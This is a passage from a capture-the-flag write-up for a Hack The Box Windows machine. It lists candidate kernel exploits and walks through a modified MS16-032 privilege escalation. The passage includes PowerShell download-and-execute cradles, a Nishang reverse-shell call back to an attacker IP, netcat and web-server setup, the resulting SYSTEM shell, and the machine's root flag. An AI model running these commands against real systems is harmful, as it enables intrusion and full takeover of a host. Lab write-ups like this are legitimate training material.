CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Not Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Not Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
             ample-Exploits/MS16-135
VulnStatus : Appears Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
             tml
VulnStatus : Not Vulnerable



PS C:\Users\kostas\Desktop>
```

From here we can find there are two exploitable CVEs, but I'm choosing `MS16-032`. Googling for MS16-032 exploits returns multiple scripts, one of which is from **[PowerShell-Suite](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1)** by FuzzySecurity.

However, we can't use the original script as-is because it spawns a new PowerShell window with SYSTEM privileges on the target machine itself. Since we only have a command-line shell (not RDP or physical access), we wouldn't be able to interact with that spawned PowerShell window - it would open locally on the target machine where we can't see it.

What we need instead is a modified version that sends us a reverse shell with SYSTEM privileges back to our attacker machine. That's why we use the **[Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1)** version of the MS16-032 exploit (or modify the original script). The Empire version is essentially the same exploit, but instead of spawning a local PowerShell window, it's modified to execute a reverse shell payload that connects back to us, giving us an interactive SYSTEM shell on our machine.

<img width="942" height="576" alt="image" src="https://github.com/user-attachments/assets/9b37c4c6-638f-4b3c-9b74-de0a853a0e14" />

First, we need to edit the **Empire version** of `Invoke-MS16032.ps1` to change what it executes after exploiting the vulnerability.

**Find this section in the script** (near the end):
```powershell
$StartTokenRace.Stop()
$SafeGuard.Stop()
```

**Add this line after it:**
```powershell
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.16.6:8888/shell.ps1')"
```

This tells the exploit: *"After you get SYSTEM privileges, download and execute shell.ps1 from my web server"*

The `shell.ps1` file is actually **Invoke-PowerShellTcp.ps1** from the **[Nishang](https://github.com/samratashok/nishang)** framework, renamed for convenience.

**Edit the bottom of shell.ps1** and add:
```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.6 -Port 9877
```

This function call tells the script to connect back to your attacker machine.

Start a Python web server to serve both scripts:
```bash
python3 -m http.server 8888
```

Your web server will serve:
- `Invoke-MS16032.ps1` (modified exploit)
- `shell.ps1` (reverse shell payload)

On your attacker machine, start a netcat listener:
```bash
nc -lvnp 9877
```

<img width="913" height="605" alt="image" src="https://github.com/user-attachments/assets/6dbf0060-895f-4309-970e-b87feaf54067" />

From your compromised shell on the target, run:
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.6:8888/Invoke-MS16032.ps1')
```

And finally we got the shell as **SYSTEM**
```
PS C:\Users\kostas\Desktop>whoami                                                              
nt authority\system                                                                            
PS C:\Users\kostas\Desktop> cd ../../                                                          
PS C:\Users> dir                                                                               
                                                                                               
                                                                                               
    Directory: C:\Users                                                                        
                                                                                               
                                                                                               
Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----         18/3/2017   1:52 ??            Administrator                     
d----         18/3/2017   1:57 ??            kostas                            
d-r--         22/8/2013   6:39 ??            Public                            
                                               
                                                                                               
PS C:\Users> cd Administrator/Desktop   
PS C:\Users\Administrator\Desktop> type root.txt
a66613d0cc1c353b8574adc17fc0800e
PS C:\Users\Administrator\Desktop> 
```

**[Badge](https://labs.hackthebox.com/achievement/machine/1737187/6)**


